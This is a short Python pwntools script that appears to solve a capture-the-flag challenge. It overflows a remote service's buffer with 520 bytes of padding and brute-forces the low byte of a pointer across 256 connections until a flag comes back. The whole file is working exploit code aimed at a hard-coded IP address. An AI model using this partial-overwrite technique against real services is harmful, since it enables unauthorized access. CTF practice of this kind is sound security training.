from pwn import *

padding = b'0' * 520
possible_low_bytes = range(256)

for low_byte in possible_low_bytes:
    try:
        io = remote('34.100.142.216', 1337)
        print(io.recvline().strip().decode())

        msg = padding + low_byte.to_bytes(1, 'little')

        io.send(msg)

        response = io.recvline().strip().decode()
        if response:
            print(response)
            print('found the flag')
            if 'nite' in response:
                break

    except EOFError:
        print('low byte:', low_byte, 'is not the right low byte for the pointer')
    finally:
        if 'io' in locals():
            io.close()